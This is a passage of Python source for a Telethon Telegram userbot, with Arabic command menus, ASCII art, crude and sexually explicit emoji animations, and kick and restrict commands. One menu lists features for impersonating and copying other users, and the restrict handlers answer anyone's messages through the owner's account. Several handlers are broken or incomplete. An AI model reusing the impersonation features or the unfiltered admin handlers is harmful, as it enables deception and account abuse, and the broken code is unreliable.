    await event.reply(m17_text)

@client.on(events.NewMessage(from_users='me', pattern='.م18'))
async def show_m18_commands(event):
    await event.delete()
    m18_text = """
<━━━[★] اوامر القنوات [★]━━━>
▪︎ `.قائمه قنواتي`
يقوم بي اظهار جميع قنواتك 

▪︎ `.قائمه كروباتي`
يقوم بإظهار جميع كروباتك
"""
    await event.reply(m18_text)

@client.on(events.NewMessage(from_users='me', pattern='.م19'))
async def show_m19_commands(event):
    await event.delete()
    m19_text = """
<━━━[★] اوامر الالعاب [★]━━━>
 `.بلي`
عباره عن العاب 

 `بوسة`
لا داعي
"""    
    await event.reply(m19_text)
    
@client.on(events.NewMessage(from_users='me', pattern='.م20'))
async def show_m20_commands(event):
    await event.delete()
    m20_text = """
<━━━[★] اوامر اضافيه[★]━━━>
 • `كتابة `+ عدد الثواني 
 = لأضهار كلمة يكتب .. بشكل وهمي

 • `فيد` + عدد الثواني 
 = لأظهار بأنك ترسل فيديو في المجموعة او الخاص

 • `لعبة` + عدد الثواني 
 = لإظهار بأنك تلعب 

 • `صوتية` + عدد الثواني 
 = لأظهار بأنك تسجل بصمة
"""    
    await event.reply(m20_text)    

@client.on(events.NewMessage(from_users='me', pattern='.م21'))
async def show_m21_commands(event):
    await event.delete()
    m21_text = """
<━━━[★] اوامر 2 التسليه [★]━━━>
 • `.بنج`
▪︎ يعرض لك سرعه نتك 

 • `.انمي`
▪︎ يقوم بي انشاء صور الانمي 

 • `.كت`
▪︎ يقوم بي اعطاك اسالة 

 • `.عكس`
▪︎ يقوم بعكس الكلام برد على الكلام

 • `.خيروك`
▪︎ يقوم بإعطاء خيارات اساله 
"""    
    await event.reply(m21_text)    

@client.on(events.NewMessage(from_users='me', pattern='.م22'))
async def show_m22_commands(event):
    await event.delete()
    m22_text = """
<━━━[★] اوامر البصمات[★]━━━>
• ︎البصمة : `.غنيلي`. ︎ 
• ︎البصمة : `.شعر`   ︎  
• ︎البصمة : `.قران`.   
• ︎البصمة : `.زيج حزين`
• ︎البصمة : `.يعني هل خره`
• ︎البصمة : `.لوكي شدخلك`
• ︎البصمة : `.الى متى`
• ︎البصمة : `.احط رجلي`
• ︎البصمة : `.تبا`
• ︎البصمة : `.اكل خرا`
"""    
    await event.reply(m22_text)    

@client.on(events.NewMessage(from_users='me', pattern='.م23'))
async def show_m23_commands(event):
    await event.delete()
    m23_text = """
<━━━[★] اوامر التقليد والانتحال [★]━━━>
 • `.تفعيل التخزين`

 • `.انتحال | بالرد على رسالة`

 • `.ارجاع`

 • `.تقليد | بالرد`

 • `.ايقاف التقليد`
"""    
    await event.reply(m23_text)    

@client.on(events.NewMessage(from_users='me', pattern='.م24'))
async def show_m24_commands(event):
    await event.delete()
    m24_text = """
<━━━[★] اوامر التحشيش [★]━━━>
 • `.رفع مرتي`
 • `.رفع جلب`
 • `.زواج`
 • `.طلاك`
 • `.رفع ابن قحبة`
"""    
    await event.reply(m24_text)    

@client.on(events.NewMessage(from_users='me', pattern='.غبي'))
async def dumb_brain(event):
    try:
        
        await event.delete()

        
        message_texts = [
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠         <(^_^ <)🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠       <(^_^ <)  🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠     <(^_^ <)  🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠   <(^_^ <)  🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n🧠 <(^_^ <)  🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n  (> ^_^)>🧠       🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n    (> ^_^)>🧠     🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n        (> ^_^)>🧠 🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n           (> ^_^)>🗑",
            "YOᑌᖇ ᗷᖇᗩIᑎ ➡️ 🧠\n\n           <(^_^ <)🗑"
        ]

        
        message = await client.send_message(event.chat_id, message_texts[0])

        
        for text in message_texts[1:]:
            await asyncio.sleep(1)
            await message.edit(text)
            
    except Exception as e:
        await client.send_message(event.chat_id, f"⚠️ حدث خطأ: {e}")

@client.on(events.NewMessage(pattern=r"\.(احم|غبي)$"))  # Match either .احم or .غبي
async def sexy(event):
    if event.fwd_from:
        return
    if event.pattern_match.group(1) == "احم":
        animation_interval = 2
        animation_ttl = range(0, 15)
        await event.edit("تنبيه العرض اباحي")
        animation_chars = [
            "قصة 💘 قصيرة ",
            "  😐             😕 \n/👕\         <👗\ \n 👖               /|",    
            "  😉          😳 \n/👕\       /👗\ \n  👖            /|",
            "  😚            😒 \n/👕\         <👗> \n  👖             /|",
            "  😍         ☺️ \n/👕\      /👗\ \n  👖          /|",
            "  😍          😍 \n/👕\       /👗\ \n  👖           /|",
            "  😘   😊 \n /👕\/👗\ \n   👖   /|",
            " 😳  😁 \n /|\ /👙\ \n /     / |",    
            "😈    /😰\ \n<|\      👙 \n /🍆    / |",
            "😅 \n/(),✊😮 \n /\         _/\\/|",
            "😎 \n/\\_,__😫 \n  //    //       \\",
            "😖 \n/\\_,💦_😋  \n  //         //        \\",
            "  😭      ☺️ \n  /|\   /(👶)\ \n  /!\   / \ ",
            "النهاية ترااااا 😂..."
        ]

@client.on(events.NewMessage(from_users='me', pattern='.ترحيب'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───
───█▒▒░░░░░░░░░▒▒█───
────█░░█░░░░░█░░█────
─▄▄──█░░░▀█▀░░░█──▄▄─
█░░█─▀▄░░░░░░░▄▀─█░░█
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
█░░║║║╠─║─║─║║║║║╠─░░█
█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.نادم'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⡉⣉⡛⣛⠿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⠋⠁⠄⠄⠄⠄⠄⢀⣸⣿⣿⡿⠿⡯⢙⠿⣿⣿⣿⣿
⣿⣿⡿⠄⠄⠄⠄⠄⡀⡀⠄⢀⣀⣉⣉⣉⠁⠐⣶⣶⣿⣿⣿⣿
⣿⣿⡇⠄⠄⠄⠄⠁⣿⣿⣀⠈⠿⢟⡛⠛⣿⠛⠛⣿⣿⣿⣿⣿
⣿⣿⡆⠄⠄⠄⠄⠄⠈⠁⠰⣄⣴⡬⢵⣴⣿⣤⣽⣿⣿⣿⣿⣿
⣿⣿⡇⠄⢀⢄⡀⠄⠄⠄⠄⡉⠻⣿⡿⠁⠘⠛⡿⣿⣿⣿⣿⣿
⣿⡿⠃⠄⠄⠈⠻⠄⠄⠄⠄⢘⣧⣀⠾⠿⠶⠦⢳⣿⣿⣿⣿⣿
⣿⣶⣤⡀⢀⡀⠄⠄⠄⠄⠄⠄⠻⢣⣶⡒⠶⢤⢾⣿⣿⣿⣿⣿
⣿⡿⠋⠄⢘⣿⣦⡀⠄⠄⠄⠄⠄⠉⠛⠻⠻⠺⣼⣿⠟⠛⠿⣿
⠋⠁⠄⠄⠄⢻⣿⣿⣶⣄⡀⠄⠄⠄⠄⢀⣤⣾⣿⡀⠄⠄⠄⢹
⠄⠄⠄⠄⠄⠄⢻⣿⣿⣿⣷⡤⠄⠰⡆⠄⠄⠈⠛⢦⣀⡀⡀⠄
⠄⠄⠄⠄⠄⠄⠈⢿⣿⠟⡋⠄⠄⠄⢣⠄⠄⠄⠄⠄⠈⠹⣿⣀
⠄⠄⠄⠄⠄⠄⠄⠘⣷⣿⣿⣷⠄⠄⢺⣇⠄⠄⠄⠄⠄⠄⠸⣿
⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⡇⠄⠄⠸⣿⡄⠄⠈⠁⠄⠄⠄⣿
⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⡇⠄⠄⠄⢹⣧⠄⠄⠄⠄⠄⠄⠘
"""
    await event.reply(welcome_message)
    
@client.on(events.NewMessage(pattern=f"\.قنبلة$", outgoing=True))
async def bombs(event):
    if event.fwd_from:
        return
    await event.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n")
    await asyncio.sleep(0.5)
    await event.edit("💣💣💣💣 \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n")
    await asyncio.sleep(0.5)
    await event.edit("▪️▪️▪️▪️ \n💣💣💣💣 \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n")
    await asyncio.sleep(0.5)
    await event.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n💣💣💣💣 \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n")
    await asyncio.sleep(0.5)
    await event.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n💣💣💣💣 \n▪️▪️▪️▪️ \n")
    await asyncio.sleep(0.5)
    await event.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n💣💣💣💣 \n")
    await asyncio.sleep(1)
    await event.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n💥💥💥💥 \n")
    await asyncio.sleep(0.5)
    await event.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n💥💥💥💥 \n💥💥💥💥 \n")
    await asyncio.sleep(0.5)
    await event.edit("▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n▪️▪️▪️▪️ \n😵😵😵😵 \n")
    await asyncio.sleep(0.5)
    await event.edit("`RIP PLOXXX......`")
    await asyncio.sleep(2)
   
@client.on(events.NewMessage(from_users='me', pattern='.سبونج بوب'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
   ╱▔▔▔▔▔▔▔▔▔▔▔▏
╱╭▏╮╭┻┻╮╭┻┻╮ ╭▏ 
╮╰▏╯┃╭╮┃┃╭╮┃ ╰▏ 
╯┈▏┈┗┻┻┛┗┻┻┻╮ ▏ 
╭╮▏╮┈┈┈┈┏━━━╯ ▏
╰╯▏╯╰┳┳┳┳┳┳╯ ╭▏
┈╭▏╭╮┃┗┛┗┛┃┈ ╰▏ 
┈╰▏╰╯╰━━━━╯┈┈ ▏I'm سبـونـج بــوب
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.صدمه'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
⣿⣿⣿⡇⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡇⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡇⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡇⠄⣿⣿⣿⡿⠋⣉⣉⣉⡙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⠃⠄⠹⠟⣡⣶⢟⣛⣛⡻⢿⣦⣩⣤⣬⡉⢻⣿⣿⣿⣿
⣿⣿⣿⠄⢀⢤⣾⣿⣿⣿⡿⠿⠿⠿⢮⡃⣛⡻⢿⠈⣿⣿⣿⣿
⣿⡟⢡⣴⣯⣿⣿⣿⠤⣤⣭⣶⣶⣶⣮⣔⡈⠛⢓⠦⠈⢻⣿⣿
⠏⣠⣿⣿⣿⣿⣿⣿⣯⡪⢛⠿⢿⣿⣿⣿⡿⣼⣿⣿⣮⣄⠙⣿
⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⡭⠴⣶⣶⣽⣽⣛⡿⠿⠿⠇⣿
⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣷⣝⣛⢛⢋⣥⣴⣿⣿
⣿⣿⣿⣿⣿⢿⠱⣿⣛⠾⣭⣛⡿⢿⣿⣿⣿⣿⣿⡀⣿⣿⣿⣿
 ⠽⡻⢿⣮⣽⣷⣶⣯⣽⣳⠮⣽⣟⣲⠯⢭⣿⣛⡇⣿⣿⣿⣿
⠄⠄⠈⠑⠊⠉⠟⣻⠿⣿⣿⣿⣷⣾⣭⣿⠷⠶⠂⣴⣿⣿⣿⣿
⠄⠄⠄⠄⠄⠄⠄⠁⠙⠒⠙⠯⠍⠙⢉⣡⣶⣿⣿⣿⣿⣿⣿⣿
⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿
"""
    await event.reply(welcome_message)
    

@client.on(events.NewMessage(from_users='me', pattern='.طائره'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
    🔲 ▬▬▬.◙.▬▬▬ 🔳
            ═▂▄▄▓▄▄▂ 
           ◢◤    █▀▀████▄▄▄▄◢◤ 
           █▄ █ █▄ ███▀▀▀▀▀▀▀╬
           ◥█████◤ 
             ══╩══╩══ 
                      ╬═╬ 
                      ╬═╬     
                      ╬═╬ ☻/ 
                      ╬═╬/▌ 
                      ╬═╬//\"""
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.حب'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
┳┻┳┻╭━━━━╮╱▔▔▔╲
┻┳┻┳┃╯╯╭━┫▏╰╰╰▕
┳┻┳┻┃╯╯┃▔╰┓▔▂▔▕╮
┻┳┻┳╰╮╯┃┈╰┫╰━╯┏╯
┳┻┳┻┏╯╯┃╭━╯┳━┳╯
┻┳┻┳╰━┳╯▔╲╱▔╭╮▔╲
┳┻┳┻┳┻┃┈╲┈╲╱╭╯╮▕
┻┳┻┳┻┳┃┈▕╲▂╱┈╭╯╱
┳┻┳┻┳┻┃'''┈┃┈┃┈'''╰╯
┻┳┻┳┻┏╯▔'''╰┓┣━┳┫
┳┻┳┻┳╰┳┳┳'''╯┃┈┃┃
┻┳┻┳┻┳┃┃┃┈'''┃┈┃┃
┳┻┳┻┳┻┃┃┃'''┊┃┈┃┃
┻┳┻┳┻┳┃┃┃┈'''┃┈┃┃
┳┻┳┻┳┻┣╋┫'''┊┣━╋┫
┻┳┻┳┻╭╯╰╰-╭╯━╯.''╰╮
"**I Love You 💕** 
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.وحش'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
▄███████▄
█▄█████▄█
█▼▼▼▼▼█
██________█▌
█▲▲▲▲▲█
█████████
_████"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.السورس'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
المطور @X_54P

قناه السورس @S21S6

مجموعة الدعم @e_u0e
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.قاتل'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
_/﹋\_
(҂`_´)
<,︻╦╤─ ҉ - - - 🤯
_/﹋\_
"""
@client.on(events.NewMessage(from_users='me', pattern='.احبك'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
❤️ I • L O V E • Y O U
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.مسدس'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
░▐█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█▄
░███████████████████████ 
░▓▓▓▓▓▓▓▓▓▓▓▓██▓▓▓▓▓▓▓▓◤ 
░▀░▐▓▓▓▓▓▓▌▀█░░░█▀░
░░░▓▓▓▓▓▓█▄▄▄▄▄█▀░░
░░█▓▓▓▓▓▌░░░░░░░░░░
░▐█▓▓▓▓▓░░░░░░░░░░░
░▐██████▌░░░░░░░░░░
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.كلب'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
╥━━━━━━━━╭━━╮━━┳
╢╭╮╭━━━━━┫┃▋▋━▅┣
╢┃╰┫┈┈┈┈┈┃┃┈┈╰┫┣
╢╰━┫┈┈┈┈┈╰╯╰┳━╯┣
╢┊┊┃┏┳┳━━┓┏┳┫┊┊┣
╨━━┗┛┗┛━━┗┛┗┛━━┻
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.هلو'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
╔┓┏╦━╦┓╔┓╔━━╗
║┗┛║┗╣┃║┃║X X║
║┏┓║┏╣┗╣┗╣╰╯║
╚┛┗╩━╩━╩━╩━━╝
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.ثعبان'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
░░░░▓
░░░▓▓
░░█▓▓█
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░██▓▓██
░░██▓▓██
░░░██▓▓██
░░░░██▓▓██
░░░░░██▓▓██
░░░░██▓▓██
░░░██▓▓██
░░██▓▓██
░░██▓▓██
░░██▓▓██
░░██▓▓██
░░██▓▓██
░░██▓▓██
░░░██▓▓███
░░░░██▓▓████
░░░░░██▓▓█████
░░░░░░██▓▓██████
░░░░░░███▓▓███████
░░░░░████▓▓████████
░░░░█████▓▓█████████
░░░█████░░░█████●███
░░████░░░░░░░███████
░░███░░░░░░░░░██████
░░██░          ░████
░░░░░░░░░░░░░░░░███
░░░░░░░░░░░░░░░░░░░
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.دس لايك'))
async def send_welcome_message(event):
    await event.delete()
    welcome_message = """
███████▄▄███████████▄
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓█░░░░░░░░░░░░░░█
▓▓▓▓▓▓███░░░░░░░░░░░░█
██████▀░░█░░░░██████▀
░░░░░░░░░█░░░░█
░░░░░░░░░░█░░░█
░░░░░░░░░░░█░░█
░░░░░░░░░░░█░░█
░░░░░░░░░░░░▀▀
"""
    await event.reply(welcome_message)

@client.on(events.NewMessage(from_users='me', pattern='.اشارة'))
async def signal_animation(event):
    await event.delete()
    
    sequences = [
        "▁ ▂ ▄ ▅ ▆ ▇ █",
        "▁ ▂ ▄ ▅ ▆ ▇ ▒",
        "▁ ▂ ▄ ▅ ▆ ▒ ▒",
        "▁ ▂ ▄ ▅ ▒ ▒ ▒",
        "▁ ▂ ▄ ▒ ▒ ▒ ▒",
        "▁ ▂ ▒ ▒ ▒ ▒ ▒",
        "▁ ▒ ▒ ▒ ▒ ▒ ▒",
        "▒ ▒ ▒ ▒ ▒ ▒ ▒",
        "▒ ▒ ▒ ▒ ▒ ▒ ▁",
        "▒ ▒ ▒ ▒ ▒ ▂ ▁",
        "▒ ▒ ▒ ▒ ▄ ▂ ▁",
        "▒ ▒ ▒ ▅ ▄ ▂ ▁",
        "▒ ▒ ▆ ▅ ▄ ▂ ▁",
        "▒ ▇ ▆ ▅ ▄ ▂ ▁",
        "█ ▇ ▆ ▅ ▄ ▂ ▁"
    ]
    
    try:
        
        message = await event.reply(sequences[0])
        
        
        for seq in sequences[1:]:
            await asyncio.sleep(1)  
            await message.edit(seq)
    
        
        
        
        
    except Exception as e:
        await event.reply(f"⚠️ حدث خطأ أثناء تنفيذ أمر الإشارة: {e}")

@client.on(events.NewMessage(from_users='me', pattern='.طرد'))
async def kick_user(event):
    try:
        
        if event.is_reply:
            reply_message = await event.get_reply_message()
            user_id = reply_message.sender_id
        else:
            
            command, username = event.raw_text.split(' ', 1)
            if username.startswith('@'):
                username = username[1:]  
            user = await client.get_entity(username)
            user_id = user.id
        
        
        try:
            await client(EditBannedRequest(
                event.chat_id,
                user_id,
                ChatBannedRights(until_date=None, view_messages=True)  
            ))
            await event.reply(f"⎙ تم طرد المستخدم بنجاح.")
        except UserAdminInvalidError:
            await event.reply("⎙ لا يمكن طرد المشرفين.")
        except ChatAdminRequiredError:
            await event.reply("⎙ لا أملك صلاحيات طرد الأعضاء.")
        except Exception as e:
            await event.reply(f"⎙ حدث خطأ أثناء محاولة الطرد: {e}")
    except ValueError:
        await event.reply("⎙ استخدم الصيغة الصحيحة: .طرد @username أو بالرد على رسالة.")

restricted_users_file = 'restricted_users.pkl'  


if os.path.exists(restricted_users_file):
    with open(restricted_users_file, 'rb') as f:
        restricted_users = pickle.load(f)
else:
    restricted_users = set()


@client.on(events.NewMessage(pattern=r'^.تقييد(?:\s+@?\w+)?$'))
async def restrict_user(event):
    if event.is_reply:  
        replied_msg = await event.get_reply_message()
        user_id = replied_msg.sender_id
        try:
            user = await event.get_reply_message().get_sender()
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except Exception:
            user_name = "غير معروف"
    else:  
        try:
            args = event.raw_text.split()
            if len(args) < 2:
                await event.reply("⎙ يرجى الرد على رسالة المستخدم أو كتابة اليوزر الخاص به.")
                return
            username = args[1]
            if username.startswith('@'):
                username = username[1:]
            user = await client.get_entity(username)
            user_id = user.id
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except (IndexError, ValueError):
            await event.reply("⎙ يرجى الرد على رسالة المستخدم أو كتابة اليوزر الخاص به بشكل صحيح.")
            return
        except Exception as e:
            await event.reply(f"⎙ لم يتم العثور على المستخدم: {e}")
            return

    if user_id not in restricted_users:
        restricted_users.add(user_id)
        rights = ChatBannedRights(
            until_date=None,  
            send_messages=True  
        )
        try:
            await client(EditBannedRequest(event.chat_id, user_id, rights))
            await event.reply(f"⎙ تم تقييد المستخدم: {user_name}")
            
            
            with open(restricted_users_file, 'wb') as f:
                pickle.dump(restricted_users, f)
        except Exception as e:
            await event.reply(f"⎙ حدث خطأ أثناء تقييد المستخدم: {e}")
    else:
        await event.reply("⎙ هذا المستخدم مقيد بالفعل.")


@client.on(events.NewMessage(pattern=r'^.الغاء التقييد(?:\s+@?\w+)?$'))
async def unrestrict_user(event):
    if event.is_reply:
        replied_msg = await event.get_reply_message()
        user_id = replied_msg.sender_id
        try:
            user = await event.get_reply_message().get_sender()
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except Exception:
            user_name = "غير معروف"
    else:
        try:
            args = event.raw_text.split()
            if len(args) < 2:
                await event.reply("⎙ يرجى الرد على رسالة المستخدم أو كتابة اليوزر الخاص به.")
                return
            username = args[1]
            if username.startswith('@'):
                username = username[1:]
            user = await client.get_entity(username)
            user_id = user.id
            user_name = user.first_name
            if user.last_name:
                user_name += f" {user.last_name}"
            if user.username:
                user_name += f" (@{user.username})"
        except (IndexError, ValueError):
            await event.reply("⎙ يرجى الرد على رسالة المستخدم أو كتابة اليوزر الخاص به بشكل صحيح.")
            return
        except Exception as e:
            await event.reply(f"⎙ لم يتم العثور على المستخدم: {e}")
            return

    if user_id in restricted_users:
        restricted_users.remove(user_id)
        rights = ChatBannedRights(
            until_date=None,
            send_messages=False  
        )
        try:
            await client(EditBannedRequest(event.chat_id, user_id, rights))
            await event.reply(f"⎙ تم إلغاء تقييد المستخدم: {user_name}")
            
            
            with open(restricted_users_file, 'wb') as f:
                pickle.dump(restricted_users, f)
        except Exception as e:
            await event.reply(f"⎙ حدث خطأ أثناء إلغاء تقييد المستخدم: {e}")
    else:
        await event.reply("⎙ هذا المستخدم غير مقيد.")


@client.on(events.NewMessage(pattern=r'^.المقيدين$'))
async def list_restricted_users(event):
    if restricted_users:
        user_list = ""
        for user_id in restricted_users:
            try:
                user = await client.get_entity(user_id)
                user_name = user.first_name
                if user.last_name:
                    user_name += f" {user.last_name}"
                if user.username:
                    user_name += f" (@{user.username})"
                else:
                    user_name += ""
                user_list += f"- {user_name}\n"
            except Exception:
                user_list += f"- ID: {user_id} (غير متاح)\n"
        
        
        if len(user_list) > 4000:
            
            for i in range(0, len(user_list), 4000):
                await event.reply(user_list[i:i+4000])
        else:
            await event.reply(f"⎙ قائمة المستخدمين المقيدين:\n{user_list}")
    else:
        await event.reply("⎙ لا يوجد مستخدمون مقيدون حتى الآن.")


@client.on(events.NewMessage(incoming=True))
async def delete_muted_user_messages(event):
    if event.is_private and event.chat_id in muted_users:
        await client.delete_messages(event.chat_id, [event.id])
    

async def main():
    await client.start()
    await update_username()

with client:
    client.loop.run_until_complete(main())
    